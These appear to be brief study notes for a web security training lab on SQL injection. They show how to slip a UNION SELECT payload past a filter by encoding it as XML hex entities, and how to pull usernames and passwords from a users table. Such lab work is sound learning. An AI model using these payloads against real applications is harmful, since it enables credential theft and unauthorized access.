Lab #17 - SQL injection with filter bypass via XML encoding


End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.

Analysis:

1 UNION SELECT NULL -> if attack detected, then use hackvertor

<@hex_entities>1 UNION SELECT NULL<@/hex_entities> 
-> IF figure of unit display meaning column exist
-> If no figure of unit display meaning no additional column


1 UNION SELECT username || '~'  || password  FROM users
